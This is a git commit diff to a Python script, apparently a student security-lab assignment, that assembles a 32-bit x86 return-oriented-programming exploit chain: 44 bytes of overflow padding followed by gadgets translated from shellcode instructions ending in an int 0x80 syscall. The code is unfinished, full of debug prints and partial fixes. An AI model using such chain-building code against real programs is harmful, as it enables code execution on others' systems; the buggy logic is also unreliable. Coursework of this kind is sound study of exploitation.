034ab3155f543e8de049cfe7336d4df0422ec24b
sakshi <sakshisaraff@gmail.com>
2023-12-02 17:52:44 +0000

    Trying

--- vagrant/synced/task4.py
+++ vagrant/synced/task4.py
@@ -4,6 +4,7 @@ import re
 import argparse
 from pathlib import Path
 from struct import pack
+import sys
 
 
 parser = argparse.ArgumentParser(
@@ -19,12 +20,29 @@ def main(args):
 
     gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
     gadgets = removeNone(gadgets)
+    # print(gadgets.keys(),gadgets.values())
     rop_chain = b'A'*44
+    # sys.stdout.buffer.write(rop_chain)
+    # print("----")
     data_values = []
+    null = None
     contents,data_values = reads(args.shellcode, data_address,data_values)
-    rop_chain, stack_ptr, argv_ptr, chunks = chunking(data_values,gadgets, data_address, rop_chain, null)
+    rop_chain, stack_ptr, argv_ptr, chunks,null = chunking(data_values,gadgets, data_address, rop_chain, null)
     rop_chain += pack('<I', argv_ptr)  # Put argv in ecx
     rop_chain, register_info = readinstructions(args.shellcode,data_address,data_values,contents,rop_chain,gadgets, null)
+    # print(rop_chain.hex())
+    # print((rop_chain))
+    # print("----")
+
+    sys.stdout.buffer.write(rop_chain)
+
+    file_path = "chain"
+    try:
+        with open(file_path, 'xb') as file:  # 'xb' mode for creating and writing in binary
+            file.write(rop_chain)
+    except FileExistsError:
+        print(f"The file '{file_path}' already exists.")
+
 
 def reads(file_name,data_address,data_values):
     rodata_start = False
@@ -47,37 +65,24 @@ def reads(file_name,data_address,data_values):
                         label, data = line.split(':', 1)
                         label = label.strip()
                         data = data.strip()
+                        print(data, "data")
+                        print(label, "label")
                         label_address_map[label] = current_address  # Map label to current address
-                        # size = {'db': 1, 'dw': 2, 'dd': 4, 'dq': 8, 'dt': 10}.get(directive, 0)
-                        # Process db directive
-                        if 'db' in data:
-                            # Calculate the size of the data
-                            parts = data.split('"')
-                            string_value = parts[1]
-                            data_values.append(string_value)  # Add the string value to the list
-                            string_size = len(string_value) + 1  # Add 1 for the null terminator
-                            current_address += string_size  # Update the current address
-
-                        elif 'dw' in data:
-                            current_address += 2  # dw is typically 2 bytes for an address
-
-                        elif 'dd' in data:
-                             # Split the data items and allocate 4 bytes for each
-                            items = data.replace('dq', '').split(',')
+                        if 'db' in data or 'dw' in data or 'dd' in data or 'dq' in data or 'dt' in data:
+                            # Parse the data line
+                            items, current_address = parse_assembly_line(data, current_address)
+                            print(items, "items")
                             for item in items:
-                                current_address += 4  
+                                data_values.append(item)
+                                # print(data_values, "data_values")
+                        elif 'equ' in data:
+                            # Get the value of the equ
+                            value = data.split(' ')[3]
+                            print(value, "value")
+                            if value in label_address_map:
+                                label_address_map[label] = label_address_map[value] - current_address
 
-                        elif 'dq' in data:
-                            # items = data.replace('dq', '').split(',')
-                            # if len(items) > 1:
-                            #     for item in items:
-                            #          current_address += 4 
-                            # else:
-                                current_address += 8  
 
-                        # Process dq directive
-                        elif 'dd' in data:
-                            current_address += 10  
 
     except FileNotFoundError:
         print(f"The file {file_name} was not found.")
@@ -131,7 +136,7 @@ def parse_out_rop(path: Path):
 
     return rop_gadgets, data_address
 
-def chunking(array, gadgets, data_address, rop_chain):
+def chunking(array, gadgets, data_address, rop_chain,null):
     stack_pointer = data_address
     pointers = []
     chunks = []
@@ -144,27 +149,25 @@ def chunking(array, gadgets, data_address, rop_chain):
         new_chunks.append(chunks)
 
         for chunk in chunks:
-
-            push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
+            rop_chain = push_string(gadgets, stack_pointer, chunk.encode('utf-8'),rop_chain)
             stack_pointer += 4
 
         null = stack_pointer
-        rop_chain += push_null(gadgets, stack_pointer)
+        rop_chain = push_null(gadgets, stack_pointer,rop_chain)
         stack_pointer += 4
 
     array_pointer = stack_pointer
     
     for pointer in pointers:
-        push_item(gadgets, stack_pointer, pointer)
+        rop_chain = push_item(gadgets, stack_pointer, pointer,rop_chain)
         stack_pointer += 4
     
-    rop_chain += push_null(gadgets, stack_pointer)
+    rop_chain = push_null(gadgets, stack_pointer, rop_chain)
     stack_pointer += 4
 
     return rop_chain, stack_pointer, array_pointer, new_chunks, null
 
-def push_string(gadgets, stack_pointer, string):
-    rop_chain = b''
+def push_string(gadgets, stack_pointer, string, rop_chain):
     rop_chain += pack('<I', gadgets[": pop edx ; ret"])
     rop_chain += pack('<I', stack_pointer)
     rop_chain += pack('<I', gadgets[": pop eax ; ret"])
@@ -173,8 +176,8 @@ def push_string(gadgets, stack_pointer, string):
     return rop_chain
 
 
-def push_item(gadgets, stack_pointer, item):
-    rop_chain = b''
+def push_item(gadgets, stack_pointer, item,rop_chain):
+    # rop_chain = b''
     rop_chain += pack('<I', gadgets[": pop edx ; ret"])
     rop_chain += pack('<I', stack_pointer)
     rop_chain += pack('<I', gadgets[": pop eax ; ret"])
@@ -183,8 +186,8 @@ def push_item(gadgets, stack_pointer, item):
     return rop_chain
 
 
-def push_null(gadgets, stack_pointer):
-    rop_chain = b''
+def push_null(gadgets, stack_pointer,rop_chain):
+    # rop_chain = b''
     rop_chain += pack('<I', gadgets[": pop edx ; ret"])
     rop_chain += pack('<I', stack_pointer)
     rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
@@ -218,8 +221,8 @@ def readinstructions(file_name, data_address, data_values, contents,rop_chain,ga
                         arg1 = parts[1].rstrip(',')
                         arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
                         # Call the mov function with the extracted arguments
-                        # if arg1 and arg2:
-                            # xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
+                        if arg1 and arg2:
+                            rop_chain = xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                 elif 'int' in line:
                     parts = line.split()
                     rop_chain = intline(parts[0],parts[1], data_values,contents,rop_chain,gadgets,register_info)
@@ -245,11 +248,13 @@ def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
                     rop_chain += pack('<I', contents.get(ar2))
                     rop_chain += pack('<I', contents.get(register_info.get('ebx')))
                     register_info[ar1] = ar2
+                    print("2")
             elif(ar1 == 'ebx'):   
                 if ": pop ebx ; ret" in gadgets: 
                     rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
                     rop_chain += pack('<I', contents.get(ar2))
                     register_info[ar1] = ar2
+                    print("1")
             elif(ar1 == 'eax'):    
                 if ": pop eax ; ret" in gadgets:
                     rop_chain += pack('<I', gadgets[": pop eax ; ret"])
@@ -278,6 +283,7 @@ def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
                     if ': inc eax ; ret' in gadgets:
                         rop_chain += pack('<I', gadgets[": inc eax ; ret"])
                         register_info[ar1] = ar2   
+                        print("4")
                 
                 elif(ar1 == 'ebx'):
                     if ': inc ebx ; ret' in gadgets:
@@ -287,7 +293,7 @@ def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
 
     return rop_chain,register_info
 
-def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null):
+def xor(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info,null):
     
     if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
         if (ar1 == 'edx'):
@@ -308,18 +314,15 @@ def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                     elif condition3:
                         # Code to handle condition3
                         rop_chain += pack('<I', gadgets[': sub edx, edx ; ret'])
-                else
+                else:
                         if ": pop edx ; ret" in gadgets: 
                             rop_chain += pack('<I', gadgets[": pop edx ; ret"])
-                            p += pack('<I', null) 
-
-
-                
-        if (ar1 == 'ebx')
+                            rop_chain += pack('<I', null) 
+                            print("3")
+        if (ar1 == 'ebx'):
             condition1 = ': and ebx, 0 ; ret' in gadgets
             condition2 = ': mov ebx, 0 ; ret' in gadgets
             condition3 = ': sub ebx, ebx ; ret' in gadgets
-
             if ar1 == ar2:
                 if ': xor ebx, ebx ; ret' in gadgets:
                     rop_chain += pack('<I', gadgets[": xor ebx, ebx ; ret"])
@@ -333,12 +336,12 @@ def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                     if condition3:
                         # Code to handle condition3
                         rop_chain += pack('<I', gadgets[': sub ebx, ebx ; ret'])
-                else
+                else:
                         if ": pop ebx ; ret" in gadgets: 
                             rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
-                            p += pack('<I', null)
+                            rop_chain += pack('<I', null)
                     
-        if (ar1 == 'ecx')
+        if (ar1 == 'ecx'):
             condition1 = ': and ecx, 0 ; ret' in gadgets
             condition2 = ': mov ecx, 0 ; ret' in gadgets
             condition3 = ': sub ecx, ecx ; ret' in gadgets
@@ -356,12 +359,12 @@ def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                     if condition3:
                         # Code to handle condition3
                         rop_chain += pack('<I', gadgets[': sub ecx, ecx ; ret'])
-                    else
+                    else:
                         if ": pop ecx ; ret" in gadgets: 
                             rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
-                            p += pack('<I', null)
+                            rop_chain += pack('<I', null)
 
-        if (ar1 == 'eax')
+        if (ar1 == 'eax'):
             condition1 = ': and eax, 0 ; ret' in gadgets
             condition2 = ': mov eax, 0 ; ret' in gadgets
             condition3 = ': sub eax, eax ; ret' in gadgets
@@ -379,14 +382,17 @@ def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                     if condition3:
                         # Code to handle condition3
                         rop_chain += pack('<I', gadgets[': sub eax, eax ; ret'])
-                else
-                        if ": pop eax ; ret" in gadgets: 
-                            rop_chain += pack('<I', gadgets[": pop eax ; ret"])
-                            p += pack('<I', null)
+                else:
+                    if ": pop eax ; ret" in gadgets: 
+                        rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+                        rop_chain += pack('<I', null)
+
+    return rop_chain
 
 def intline(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
     if(ar2 == '0x80'):
         rop_chain += pack('<I', gadgets[": int 0x80"])
+        print("5")
 
     return rop_chain    
 
@@ -405,6 +411,37 @@ def removeNone(gadgets):
             del gadgets[key]
 
     return gadgets
+
+def parse_assembly_line(data_line,current_address):
+    # Determine the directive used (db, dw, dd, dq, dt)
+    directive_match = re.search(r'db|dw|dd|dq|dt', data_line)
+    if not directive_match:
+        return [], 0  # No recognized directive found
+
+    directive = directive_match.group()
+    data_part = data_line.replace(directive, '').strip()
+
+    # Use regular expression to match string literals and other items
+    pattern = r'\".*?\"|[^\s,]+'
+    items = re.findall(pattern, data_part)
+
+    # Process each item
+    processed_items = []
+    for item in items:
+        item = item.strip()
+        if item.startswith('"') and item.endswith('"'):
+            # Remove the double quotes for string literals
+            processed_items.append(item[1:-1])
+        elif item:
+            # Append non-empty, non-string items after stripping trailing commas
+            processed_items.append(item.rstrip(','))
+
+    # Determine the byte size per item based on the directive
+    bytes_per_item = {'db': 1, 'dw': 2, 'dd': 4, 'dq': 8, 'dt': 10}.get(directive, 1)
+    total_bytes = len(processed_items) * bytes_per_item
+    current_address += total_bytes
+
+    return processed_items, current_address
 
 if __name__ == "__main__":
     main(parser.parse_args())
